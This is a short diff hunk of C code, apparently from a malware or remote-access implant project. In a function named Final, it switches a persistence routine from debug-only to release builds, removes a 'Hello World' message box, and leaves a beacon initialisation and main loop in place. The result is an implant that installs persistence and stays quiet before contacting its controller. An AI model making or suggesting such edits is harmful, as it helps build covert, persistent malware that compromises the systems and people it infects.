@@ -2452,13 +2452,12 @@ VOID Final(VOID)
 		goto CLEANUP;
 	}
 
-#ifdef _DEBUG
+#ifndef _DEBUG
 	if (!Persistence(pGlobalConfig)) {
 		goto CLEANUP;
 	}
 #endif
 
-	MessageBoxA(NULL, "Hello World", "Title", MB_OK);
 #ifdef _BEACON
 	pBeaconClient = BeaconInit(pGlobalConfig);
 	BeaconMainLoop(pBeaconClient);
